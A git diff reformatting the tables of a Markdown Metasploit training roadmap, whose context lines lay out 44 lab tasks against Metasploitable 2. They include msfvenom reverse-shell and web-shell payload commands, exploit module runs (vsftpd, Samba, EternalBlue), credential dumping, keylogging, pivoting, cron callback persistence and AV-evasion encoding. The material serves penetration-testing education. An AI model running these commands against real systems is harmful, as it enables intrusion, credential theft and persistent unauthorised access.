@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]] · [[Cyber-Security/Lab/Metasploitable_2/TASK_LIST|🐧 Metasploitable 2 Lab]] · [[Cyber-Security/Lab/OWASP_Broken_WebApps/TASK_LIST|🌐 OWASP BWA Lab]]
 
 | Recon & Scanning | Exploitation | Post-Exploitation | Web & Traffic |
-|:-----------------|:-------------|:-------------------|:--------------|
+| :----------------- | :------------- | :------------------- | :-------------- |
 | [[Nmap\|🗺️ Nmap]] | **💀 Metasploit** (you are here) | [[LinPEAS\|🐉 LinPEAS]] | [[Burp_Suite\|🕷️ Burp Suite]] |
 | [[Netcat\|🔌 Netcat]] | [[Impacket\|🐍 Impacket]] | [[BloodHound\|🩸 BloodHound]] | [[Wireshark\|🦈 Wireshark]] |
-| | [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] | |
+|| [[Hydra\|🔓 Hydra]] | [[Hashcat\|🔥 Hashcat]] ||
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals & Architecture | 6 | 3–4 hours |
 | 2 | Core Exploitation Workflow | 8 | 6–9 hours |
 | 3 | Intermediate (Post-Exploitation, Pivoting) | 7 | 6–8 hours |
@@ -40,7 +40,7 @@
 | 6 | Practical Labs | 5 | 8–14 hours |
 | 7 | Methodology & Engagement Usage | 4 | 3–4 hours |
 | 8 | Mastery Challenges | 4 | 8–12 hours |
-| | **Total** | **44** | **~43–64 hours** |
+|| **Total** | **44** | **~43–64 hours** |
 
 **Prerequisites:** Nmap scanning proficiency. Networking fundamentals. Linux CLI basics. Understanding of vulnerabilities and CVEs. A vulnerable target (Metasploitable 2).
 
@@ -84,7 +84,7 @@ exploit -j
 
 ### Key Meterpreter Commands
 | Command | Action |
-|---------|--------|
+| --------- | -------- |
 | `sysinfo` | Show system information |
 | `getuid` | Show current user |
 | `ps` | List processes |
@@ -100,7 +100,7 @@ exploit -j
 
 ### Key msfvenom Options
 | Flag | Purpose |
-|------|---------|
+| ------ | --------- |
 | `-p` | Payload (e.g., `windows/meterpreter/reverse_tcp`) |
 | `-f` | Output format (exe, elf, raw, dll, aspx, war, python) |
 | `-e` | Encoder (⚠️ most are signatured, see Task 4.2 warning) |
@@ -120,7 +120,7 @@ exploit -j
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand Metasploit's modular architecture: **Exploits** (code that triggers a vulnerability), **Payloads** (code that runs after exploitation — singles, stagers, stages), **Auxiliary** (scanning, fuzzing, sniffing — no exploitation), **Post** (post-exploitation modules), **Encoders** (payload obfuscation), **Nops** (NOP sled generation), **Evasion** (AV evasion modules). |
 | **Skills Learned** | Module hierarchy, the exploit→payload→handler pipeline, difference between singles (self-contained), stagers (small, downloads stage), and staged payloads (downloaded by stager), why architecture understanding matters for troubleshooting. |
 | **Practical Exercise** | Draw a diagram: Exploit Module → sends payload → target executes payload → payload connects back to handler. List three examples of each module type. |
@@ -134,7 +134,7 @@ exploit -j
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Navigate the msfconsole CLI interface fluently: searching modules, using help, setting global/local options, understanding the prompt changes, and using workspaces. |
 | **Skills Learned** | `search`, `use`, `info`, `show options`, `show payloads`, `set`, `setg`, `run`/`exploit`, `back`, `sessions`, `help`, tab completion, command history. |
 | **Practical Exercise** | Launch: `msfconsole`. Search: `search type:exploit platform:linux smb`. Use a module: `use exploit/unix/ftp/vsftpd_234_backdoor`. Show info: `info`. Show options: `show options`. Show compatible payloads: `show payloads`. Go back: `back`. |
@@ -148,7 +148,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Initialize the Metasploit database (PostgreSQL) and use workspaces to organize engagements. Import Nmap scan results into the database for automatic target/service population. |
 | **Skills Learned** | Database initialization (`msfdb init`), workspace management (`workspace -a <name>`, `workspace <name>`), importing scan data (`db_import`), querying hosts and services (`hosts`, `services`), database-driven exploitation. |
 | **Practical Exercise** | `sudo msfdb init` → `msfconsole` → `db_status` (confirm connected). `workspace -a lab-msf2` → `db_import /path/to/nmap-scan.xml` → `hosts` (list imported hosts) → `services` (list imported services) → `services -p 445` (filter by port). |
@@ -162,7 +162,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Understand the critical difference between staged and stageless payloads. Know when to use each and why the wrong choice causes exploits to fail. |
 | **Skills Learned** | Staged payloads (`windows/meterpreter/reverse_tcp` — note the `/`): small stager connects back, downloads the full Meterpreter DLL. Stageless (`windows/meterpreter_reverse_tcp` — note the `_`): entire payload in one binary, larger but more reliable. Listeners: staged requires `exploit/multi/handler`; stageless works with `nc` or `multi/handler`. |
 | **Practical Exercise** | Generate both: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe -o staged.exe`. `msfvenom -p windows/meterpreter_reverse_tcp LHOST=x LPORT=4444 -f exe -o stageless.exe`. Compare file sizes. Try catching the staged payload with `nc` (it fails) vs `multi/handler` (it works). |
@@ -176,7 +176,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Generate standalone payloads with msfvenom for delivery outside of Metasploit's exploit modules. This is how you create executable backdoors, web shells, and shellcode. |
 | **Skills Learned** | msfvenom syntax, output formats (`-f exe, elf, raw, python, c, asp, jsp, war, php, ps1`), platform/architecture selection, encoder usage, payload listing. |
 | **Practical Exercise** | Linux reverse shell: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o reverse_shell`. Windows Meterpreter: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o meterpreter.exe`. PHP web shell: `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php`. List all payloads: `msfvenom --list payloads | grep linux`. |
@@ -190,7 +190,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Set up the `exploit/multi/handler` module to receive connections from generated payloads. This is the universal listener for all Metasploit payloads. |
 | **Skills Learned** | Handler configuration, matching handler payload to generated payload (MUST be identical), `ExitOnSession false` for persistent listening, `LHOST 0.0.0.0` to listen on all interfaces, handler as a background job. |
 | **Practical Exercise** | `use exploit/multi/handler` → `set payload linux/x86/shell_reverse_tcp` → `set LHOST 0.0.0.0` → `set LPORT 4444` → `set ExitOnSession false` → `exploit -j` (run as background job). Deliver the matching payload to target → observe session received. |
@@ -208,7 +208,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit the vsftpd 2.3.4 backdoor on Metasploitable 2. This is the simplest Metasploit exploit — perfect for learning the workflow without complexity. |
 | **Skills Learned** | The complete exploit workflow: `search` → `use` → `show options` → `set RHOSTS` → `exploit`. Understanding that this backdoor opens a root shell on port 6200 when triggered by a username containing `:)`. |
 | **Practical Exercise** | `search vsftpd` → `use exploit/unix/ftp/vsftpd_234_backdoor` → `set RHOSTS <target>` → `exploit`. Interact with the resulting shell. Run `id`, `whoami`, `hostname`. |
@@ -222,7 +222,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit the Samba username map script vulnerability (CVE-2007-2447) on Metasploitable 2 using a command injection via the SMB username field. |
 | **Practical Exercise** | `search samba usermap` → `use exploit/multi/samba/usermap_script` → `set RHOSTS <target>` → `show payloads` → `set payload cmd/unix/reverse` → `set LHOST <attacker>` → `exploit`. |
 | **Expected Output** | Root shell via Samba exploitation. Understanding that this exploit injects commands through the SMB username field. |
@@ -234,7 +234,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Exploit Java-based services on Metasploitable 2: Java RMI registry (port 1099) and Apache Tomcat manager (port 8180). Use Meterpreter payloads instead of basic shells. |
 | **Practical Exercise** | RMI: `use exploit/multi/misc/java_rmi_server` → configure and exploit. Tomcat: `use exploit/multi/http/tomcat_mgr_upload` → `set HttpUsername tomcat` → `set HttpPassword tomcat` → `set payload java/meterpreter/reverse_tcp` → exploit. |
 | **Expected Output** | Meterpreter session on the target. First experience with Meterpreter's capabilities vs a basic shell. |
@@ -246,7 +246,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Master essential Meterpreter commands for post-exploitation: system info, process management, file operations, networking, screenshot capture, and session management. |
 | **Skills Learned** | `sysinfo`, `getuid`, `getpid`, `ps`, `migrate <PID>`, `upload`/`download`, `shell` (drop to OS shell), `background` (put session in background), `hashdump`, `search -f *.txt`, `screenshot`, `keyscan_start`/`keyscan_dump`, `portfwd`, `route`. |
 | **Practical Exercise** | From a Meterpreter session: `sysinfo` → `getuid` → `ps` → `shell` (get OS shell, then `exit` back to Meterpreter) → `download /etc/passwd /tmp/` → `upload /tmp/linpeas.sh /tmp/` → `search -f *.conf`. |
@@ -260,7 +260,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Given Nmap scan results, systematically identify potential exploits: search by service name and version, evaluate exploit quality (rank, disclosure date, reliability), and choose the best option. |
 | **Skills Learned** | `search` with filters (`search type:exploit name:apache rank:excellent`), exploit ranking system (manual, excellent, great, good, normal, average, low), `info` for exploit details, checking exploit compatibility with target OS/architecture, Exploit-DB cross-referencing. |
 | **Practical Exercise** | From Nmap results, pick three services. For each: `search` for exploits → `info` on candidates → evaluate rank and description → select the best one → document why you chose it. |
@@ -274,7 +274,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit's auxiliary modules for scanning and enumeration — NOT exploitation. These modules gather intelligence: service versions, credentials, shares, users, and vulnerabilities. |
 | **Skills Learned** | Auxiliary module usage for SMB enumeration (`auxiliary/scanner/smb/smb_enumshares`, `smb_enumusers`, `smb_version`), SSH version scanning, FTP anonymous login check, HTTP directory scanning, database-driven scanning with `db_nmap`. |
 | **Practical Exercise** | `use auxiliary/scanner/smb/smb_version` → `set RHOSTS <target>` → `run`. `use auxiliary/scanner/ftp/anonymous` → `set RHOSTS <target>` → `run`. `use auxiliary/scanner/ssh/ssh_version` → `set RHOSTS <target>` → `run`. |
@@ -288,7 +288,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Manage multiple sessions: list, interact, background, kill, rename, and upgrade basic command shells to Meterpreter sessions. |
 | **Skills Learned** | `sessions -l` (list), `sessions -i <ID>` (interact), `sessions -u <ID>` (upgrade to Meterpreter), `sessions -k <ID>` (kill), `sessions -K` (kill all), backgrounding with Ctrl+Z or `background`. |
 | **Practical Exercise** | Get a basic shell via an exploit → `background` → `sessions -l` → `sessions -u <ID>` (upgrade to Meterpreter) → `sessions -i <new-ID>` (interact with upgraded session) → `sysinfo`. |
@@ -302,7 +302,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit's post-exploitation modules for systematic information gathering from a compromised host: system enumeration, credential harvesting, network discovery, and evidence collection. |
 | **Skills Learned** | Post modules organized by OS (`post/linux/gather/*`, `post/windows/gather/*`), running post modules against sessions, `run post/linux/gather/enum_system` for Linux enumeration, credential gathering, network interface discovery. |
 | **Practical Exercise** | From an active session: `run post/linux/gather/enum_system` → `run post/linux/gather/enum_network` → `run post/linux/gather/hashdump` → `run post/multi/gather/ssh_creds`. |
@@ -320,7 +320,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use a compromised host as a pivot to access internal networks. Set up routes through Meterpreter sessions to scan and exploit hosts that aren't directly reachable from your attacker machine. |
 | **Skills Learned** | `route add <subnet> <session>`, autoroute post module, SOCKS proxy via `auxiliary/server/socks_proxy`, proxychains configuration, scanning through pivots, the concept of "lateral movement." |
 | **Practical Exercise** | From Meterpreter: `run autoroute -s 10.10.10.0/24` (route internal subnet through session). Back in msfconsole: `use auxiliary/scanner/portscan/tcp` → `set RHOSTS 10.10.10.0/24` → `run` (scan internal network through the pivot). For browser access: `use auxiliary/server/socks_proxy` → `set SRVPORT 1080` → `run -j` → configure proxychains → `proxychains nmap -sT -Pn 10.10.10.1`. |
@@ -334,7 +334,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Meterpreter's `portfwd` to forward local ports to internal services through a compromised host. This allows you to use local tools against internal services. |
 | **Skills Learned** | `portfwd add -l <localport> -p <remoteport> -r <internal-target>`, local vs remote port forwarding, accessing internal web servers and databases through forwards. |
 | **Practical Exercise** | From Meterpreter: `portfwd add -l 8888 -p 80 -r 10.10.10.5`. Now on attacker: `curl http://127.0.0.1:8888` accesses the internal web server at 10.10.10.5:80. |
@@ -348,7 +348,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Extract credentials from compromised systems: Linux password hashes (`/etc/shadow`), Windows SAM/NTLM hashes, cached credentials, and application-specific credentials. |
 | **Skills Learned** | `hashdump` (Meterpreter), `post/linux/gather/hashdump`, `post/windows/gather/smart_hashdump`, hash format identification, understanding that hashes need to be cracked (Hashcat/John) or used for pass-the-hash attacks. |
 | **Practical Exercise** | From Meterpreter on Metasploitable 2: `hashdump` → save the output → identify hash type → crack with John or Hashcat. `run post/linux/gather/enum_users_history` → check for credentials in command history. |
@@ -362,7 +362,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Install persistence mechanisms on a compromised host so you can regain access if the initial session dies. Understand both the attacker's and defender's perspective. |
 | **Skills Learned** | Cron-based persistence (Linux), service-based persistence, SSH key persistence, `run persistence` module (legacy), `exploit/linux/local/service_persistence`, why persistence is a core pentest phase, how defenders detect persistence. |
 | **Practical Exercise** | From a session: add your SSH public key to `~/.ssh/authorized_keys`. Create a cron job that calls back to your listener every 5 minutes. Then — as a defender — find and remove both persistence mechanisms. |
@@ -376,7 +376,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Intermediate-Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit's local exploit modules to escalate from a low-privilege user to root/SYSTEM. Understand the `local_exploit_suggester` for automated enumeration. |
 | **Skills Learned** | `post/multi/recon/local_exploit_suggester` (scans session for applicable local exploits), `exploit/linux/local/*` modules, setting the SESSION option, understanding that local exploits run through existing sessions. |
 | **Practical Exercise** | From a low-privilege session: `run post/multi/recon/local_exploit_suggester` → review suggestions → `use exploit/linux/local/<suggested>` → `set SESSION <id>` → `set LHOST <attacker>` → `exploit`. |
@@ -390,7 +390,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Create resource scripts (.rc files) to automate repetitive msfconsole workflows: handler setup, multi-target exploitation, post-exploitation enumeration. |
 | **Skills Learned** | Resource script syntax (plain text, one command per line), `resource <file.rc>` to execute, `makerc <file.rc>` to save current session as a script, automating handler+payload combinations, multi-stage automation. |
 | **Practical Exercise** | Create `handler.rc`: `use exploit/multi/handler\nset payload linux/x86/shell_reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nset ExitOnSession false\nexploit -j`. Launch: `msfconsole -r handler.rc`. Create `enum.rc` for post-exploitation enumeration of a session. |
@@ -404,7 +404,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit's database to track discovered hosts, services, vulnerabilities, credentials, and looted data across an engagement. |
 | **Skills Learned** | `hosts` (list hosts with OS info), `services` (list discovered services), `vulns` (list confirmed vulnerabilities), `creds` (list harvested credentials), `loot` (list exfiltrated data), filtering and exporting database contents. |
 | **Practical Exercise** | After running several exploits and post modules: `hosts` → `services -p 22,80,445` → `vulns` → `creds` → `loot`. Export: `hosts -o /tmp/hosts.csv`. |
@@ -421,7 +421,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Read, understand, and create a simple custom Metasploit module (auxiliary scanner or exploit). Understand the Ruby module structure, mixins, and API. |
 | **Skills Learned** | Ruby basics for Metasploit, module skeleton structure, Msf::Exploit::Remote mixin, `register_options`, `exploit`/`run` methods, datastore access, module documentation. |
 | **Practical Exercise** | Read an existing simple module (e.g., `modules/auxiliary/scanner/http/http_version.rb`). Modify it to add additional functionality. Write a simple auxiliary module that connects to a port and checks for a specific banner. Place in `~/.msf4/modules/`. |
@@ -436,7 +436,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 40 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use msfvenom encoders, custom templates, and evasion techniques to generate payloads that bypass basic AV detection. Understand the limitations of these techniques against modern AV/EDR. **# WARNING: shikata_ga_nai (x86/shikata_ga_nai) is obsolete and detected by every major AV/EDR as of 2023+. For modern AV evasion, use: msfvenom with custom templates, shellcode encryption, or external tools (e.g., Veil, Scarecrow).** |
 | **Skills Learned** | Encoder usage (`-e x86/shikata_ga_nai`), iteration count (`-i 5`), custom templates (`-x`), `msfvenom --list encoders`, evasion modules, understanding that encoding alone rarely bypasses modern AV. |
 | **Practical Exercise** | Generate a payload with encoding: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe`. Test against VirusTotal (use a hash check, don't upload — uploading shares with AV vendors). Compare detection rates with/without encoding. **Expect 100% detection rate** — this demonstrates why shikata_ga_nai is obsolete. |
@@ -450,7 +450,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit for Windows-specific exploitation: EternalBlue (MS17-010), psexec, pass-the-hash, token impersonation, and Mimikatz integration. |
 | **Skills Learned** | `exploit/windows/smb/ms17_010_eternalblue`, `exploit/windows/smb/psexec` (with hash or password), `post/windows/gather/smart_hashdump`, `load kiwi` (Mimikatz in Meterpreter), token manipulation (`use incognito`, `list_tokens`, `impersonate_token`). |
 | **Practical Exercise** | (Requires a Windows target) EternalBlue: `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS <target>` → `set payload windows/x64/meterpreter/reverse_tcp` → exploit. From Meterpreter: `load kiwi` → `creds_all`. |
@@ -463,7 +463,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 35 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use the Metasploit RPC API (msfrpcd) for programmatic control: launching modules, managing sessions, and retrieving results from external scripts. |
 | **Skills Learned** | `msfrpcd -P <password>` to start the RPC daemon, Python `pymetasploit3` library for API access, launching exploits programmatically, session management via API. |
 | **Expected Output** | Programmatic exploit launch and session management from a Python script. Understanding of Metasploit automation capabilities. |
@@ -475,7 +475,7 @@ exploit -j
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Objective** | Use Metasploit efficiently in CTF settings: quick exploitation, time-boxed testing, when to use Metasploit vs manual exploits (OSCP limits Metasploit to one machine). |
 | **Key Considerations** | OSCP exam allows Metasploit on only ONE machine. CTFs may or may not allow Metasploit. Speed vs learning: Metasploit is fast but you learn more from manual exploitation. Always have a manual exploitation capability as a backup. |
 
@@ -649,7 +649,7 @@ exploit -j
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can navigate msfconsole fluently | ☐ |
 | Can search, select, and configure exploits | ☐ |
 | Can generate payloads with msfvenom | ☐ |
